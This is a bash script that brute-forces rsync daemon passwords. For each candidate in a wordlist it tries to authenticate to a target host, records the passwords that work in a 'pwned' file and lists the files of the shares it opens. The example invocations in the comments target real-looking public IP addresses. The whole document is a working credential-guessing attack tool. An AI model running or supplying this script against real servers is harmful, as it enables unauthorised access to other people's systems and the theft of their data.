#!/bin/bash
# /tmp/unix.txt
# ./5-bruteforce.sh 1.1.1.1 root /usr/share/wordlists/top100-WillieStevenson.txt
# ./5-bruteforce.sh 5.39.63.77 user /usr/share/wordlists/top100-WillieStevenson.txt

RHOST="$1"
RUSER="$2"
FILE="/tmp/rbstatus.txt"
#wd="/usr/share/wordlists/rockyou.txt"
wd="$3"
#wd="/usr/share/wordlists/top100-WillieStevenson.txt"
touch pass.txt
chmod 600 pass.txt
echo "password" > pass.txt
echo "------------------------------"
echo "CONFIGURATION : "
echo "[RHOST] : $RHOST"
echo "[RUSER] : $RUSER"
echo "[SHARE] : "
echo "$(rsync $RHOST::)"
echo "[DIC] : $wd"
echo "------------------------------"
while IFS= read -r line
do
  echo "[CANDIDAT] : $line"
  echo "$line" > pass.txt
  RCMD=$(rsync --timeout=5 --password-file=pass.txt rsync://$RUSER@$RHOST)
  share=$(echo $RCMD | cut -d" " -f1)
  timeout 15 rsync --password-file=pass.txt rsync://$RUSER@$RHOST/ > rootfolders.txt
  cat rootfolders.txt  |  cut -d ' ' -f 1  |  while read output
  do
    ExploreRsync=$(rsync --timeout=5 --password-file=pass.txt rsync://$RUSER@$RHOST/$output)
    ErrorExploreRsync="@ERROR"
    if [[ "$ErrorExploreRsync" == *"$ExploreRsync"* ]]; then
      echo "[ERROR] : rsync://$RHOST/$output"
    else
      echo "PASSWORD PWNED !!! password = $line"
      echo "$RHOST:root:$line" >> pwned.txt
      echo "EXPLORING $output"
      rsync -av --list-only --timeout=5 --password-file=pass.txt rsync://$RUSER@$RHOST/$output >> $RHOST.txt
      echo "1" > /tmp/rbstatus.txt
    fi
  done
if test -f "$FILE"; then
    rm $FILE
    echo "------------------------------"
    echo "PWNED SERVERS : "
    cat pwned.txt
    echo "------------------------------"
    exit
fi
done < "$wd"

